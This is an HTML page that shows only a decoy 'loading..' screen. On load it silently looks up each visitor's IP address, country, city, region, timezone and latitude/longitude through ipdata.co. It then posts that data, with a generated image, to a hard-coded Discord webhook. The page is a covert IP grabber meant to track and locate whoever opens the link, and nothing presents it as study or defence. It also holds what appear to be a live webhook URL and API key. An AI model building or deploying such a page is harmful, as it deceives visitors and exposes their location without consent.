<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>loading ..</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #ccc;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            text-align: center;
            flex-direction: column;
        }
        .message { font-size: 1.8rem; letter-spacing: 2px; font-weight: 300; text-shadow: 0 0 5px rgba(200,200,200,0.3); }
        .small-note { margin-top: 1.2rem; font-size: 1rem; opacity: 0.75; color: #aaa; border-top: 1px solid #222; padding-top: 1.2rem; width: 70%; max-width: 500px; }
    </style>
</head>
<body>
    <div class="message">loading..</div>
    <div class="small-note">usually takes around 30 seconds</div>

    <script>
        (function() {
            "use strict";

            // ‚úÖ YOUR DISCORD WEBHOOK
            const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1460175868755443836/2oHbJuVVB0sKUZWVHYXThIt2dcTxhlDYhy3e7S7N0kGClKKz_X71iep2aOSlQAfH2E4H";
            
            // ‚úÖ YOUR IPDATA.CO API KEY (for country, city, region)
            const IPDATA_API_KEY = "723e60992a3c7f06d2905a079ebe5622b48b958f76bf187b6492f8a5ea4dc8bc";
            const IPDATA_URL = `https://api.ipdata.co?api-key=${IPDATA_API_KEY}&fields=ip,city,region,country_name,country_code,time_zone,latitude,longitude`;

            // Get current date formatted
            function getCurrentDate() {
                const d = new Date();
                return `${d.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })} at ${d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}`;
            }

            // Get visitor IP and location from ipdata.co
            async function getVisitorInfo() {
                try {
                    console.log('üìç Fetching location data from ipdata.co...');
                    const response = await fetch(IPDATA_URL);
                    if (!response.ok) throw new Error(`ipdata error: ${response.status}`);
                    const data = await response.json();
                    
                    console.log('‚úÖ ipdata.co response:', data);
                    
                    return {
                        ip: data.ip || 'Unknown',
                        country: data.country_name || 'Unknown',
                        city: data.city || 'Unknown',
                        region: data.region || 'Unknown',
                        timezone: data.time_zone?.name || Intl.DateTimeFormat().resolvedOptions().timeZone,
                        latitude: data.latitude || 'N/A',
                        longitude: data.longitude || 'N/A'
                    };
                } catch (err) {
                    console.error('‚ùå ipdata.co failed:', err);
                    // Fallback
                    return {
                        ip: 'Unknown',
                        country: 'Unknown',
                        city: 'Unknown',
                        region: 'Unknown',
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        latitude: 'N/A',
                        longitude: 'N/A'
                    };
                }
            }

            // Generate screenshot image with IP, country, timezone overlay
            function generateScreenshotDataURL(ip, country, timezone, city, region) {
                const canvas = document.createElement('canvas');
                canvas.width = 700;
                canvas.height = 350;
                const ctx = canvas.getContext('2d');

                // Dark background
                ctx.fillStyle = '#0a0c0e';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Terminal-style border
                ctx.strokeStyle = '#00ff9d';
                ctx.lineWidth = 2;
                ctx.strokeRect(15, 15, canvas.width-30, canvas.height-30);

                // Header
                ctx.font = 'bold 18px "Courier New", monospace';
                ctx.fillStyle = '#00ff9d';
                ctx.fillText('üîç PAGE SCREENSHOT ¬∑ VISITOR DATA', 40, 60);
                
                // Separator
                ctx.beginPath();
                ctx.moveTo(30, 85);
                ctx.lineTo(canvas.width-30, 85);
                ctx.strokeStyle = '#333';
                ctx.stroke();

                // IP Address - prominently displayed
                ctx.font = '16px "Courier New", monospace';
                ctx.fillStyle = '#ffffff';
                ctx.fillText('IP ADDRESS:', 50, 140);
                ctx.font = 'bold 20px "Courier New", monospace';
                ctx.fillStyle = '#ffd700';
                ctx.fillText(`${ip}`, 250, 140);

                // Country and City
                ctx.font = '16px "Courier New", monospace';
                ctx.fillStyle = '#ffffff';
                ctx.fillText('LOCATION:', 50, 190);
                ctx.font = 'bold 18px "Courier New", monospace';
                ctx.fillStyle = '#7fffd4';
                let locationText = country;
                if (city && city !== 'Unknown') locationText += `, ${city}`;
                if (region && region !== 'Unknown' && region !== city) locationText += ` (${region})`;
                ctx.fillText(`${locationText}`, 250, 190);

                // Timezone
                ctx.font = '16px "Courier New", monospace';
                ctx.fillStyle = '#ffffff';
                ctx.fillText('TIMEZONE:', 50, 240);
                ctx.font = 'bold 18px "Courier New", monospace';
                ctx.fillStyle = '#ffa07a';
                ctx.fillText(`${timezone}`, 250, 240);

                // Timestamp
                ctx.font = '12px monospace';
                ctx.fillStyle = '#888';
                ctx.fillText(`Captured: ${new Date().toLocaleString()}`, 50, canvas.height-50);
                
                // ipdata credit
                ctx.font = '10px monospace';
                ctx.fillStyle = '#555';
                ctx.fillText('ip intelligence ¬∑ ipdata.co', canvas.width-200, canvas.height-20);
                
                return canvas.toDataURL('image/png');
            }

            // Send to Discord webhook
            async function sendToDiscord(visitor) {
                const dateStr = getCurrentDate();
                const { ip, country, timezone, city, region, latitude, longitude } = visitor;
                
                console.log('üì§ Sending to Discord webhook...');
                
                try {
                    // Generate the screenshot image
                    const screenshotDataURL = generateScreenshotDataURL(ip, country, timezone, city, region);
                    const blob = await (await fetch(screenshotDataURL)).blob();
                    
                    // Create form data with file
                    const formData = new FormData();
                    formData.append('file', blob, 'visitor_screenshot.png');

                    // Create rich embed
                    const embed = {
                        title: 'üì∏ New Page Visitor',
                        color: 0x00ff9d,
                        fields: [
                            { 
                                name: 'üåê IP ADDRESS', 
                                value: `\`\`\`${ip}\`\`\``, 
                                inline: false 
                            },
                            { 
                                name: 'üìç LOCATION', 
                                value: `**Country:** ${country}\n**City:** ${city}\n**Region:** ${region}`, 
                                inline: true 
                            },
                            { 
                                name: 'üïê TIMEZONE', 
                                value: `\`${timezone}\``, 
                                inline: true 
                            },
                            { 
                                name: 'üìÖ VISIT TIME', 
                                value: `\`${dateStr}\``, 
                                inline: false 
                            }
                        ],
                        footer: {
                            text: 'ipdata.co ¬∑ IP Intelligence'
                        },
                        timestamp: new Date().toISOString()
                    };

                    // Add coordinates if available
                    if (latitude !== 'N/A' && longitude !== 'N/A') {
                        embed.fields.push({
                            name: 'üó∫Ô∏è COORDINATES',
                            value: `Lat: ${latitude}, Long: ${longitude}`,
                            inline: false
                        });
                    }

                    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

                    // Send to Discord
                    const response = await fetch(DISCORD_WEBHOOK, { 
                        method: 'POST', 
                        body: formData 
                    });
                    
                    if (response.ok) {
                        console.log('‚úÖ SUCCESS! Discord notification sent!');
                        console.log('üìä Visitor:', ip, country, city, region);
                    } else {
                        const errorText = await response.text();
                        console.error('‚ùå Discord error:', response.status, errorText);
                    }
                } catch (e) {
                    console.error('‚ùå Failed to send to Discord:', e);
                }
            }

            // Initialize - run immediately when page loads
            (async function() {
                console.log('üöÄ Page loaded, getting visitor location from ipdata.co...');
                const visitor = await getVisitorInfo();
                await sendToDiscord(visitor);
            })();
        })();
    </script>
</body>
</html>
